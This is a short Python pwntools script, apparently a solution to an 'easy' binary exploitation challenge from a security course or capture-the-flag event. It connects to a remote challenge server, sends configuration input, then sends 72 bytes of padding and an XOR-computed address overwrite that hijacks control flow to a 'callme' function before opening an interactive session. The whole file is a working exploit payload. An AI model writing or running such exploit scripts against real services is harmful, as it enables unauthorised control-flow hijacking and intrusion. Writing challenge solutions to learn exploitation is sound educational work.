#!/usr/bin/env python3
from pwn import *

exe = ELF("./easy")
# exe = ELF("./medium")
# hard chall is dynamically linked, so here's helper
# patched version to load proper ld and libc
# exe = ELF("./hard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
index_number = b"438596"


def send_config(r):
    r.sendline(index_number)
    r.sendline(b"3")


def conn():
    # r = process([exe.path, index_number])
    r = remote("bsk.bonus.re", 13337)
    # gdb.attach(r)
    send_config(r)
    r.sendline(b"8")
    r.sendline(8 * b"A")
    callme = 0x401890
    retfun = 0x401b3e
    res = p64((callme + 1) ^ retfun)

    r.sendline(b"80")
    r.sendline(72 * b"\0" + res)

    return r


def main():
    r = conn()
    # good luck!
    r.interactive()


if __name__ == "__main__":
    main()
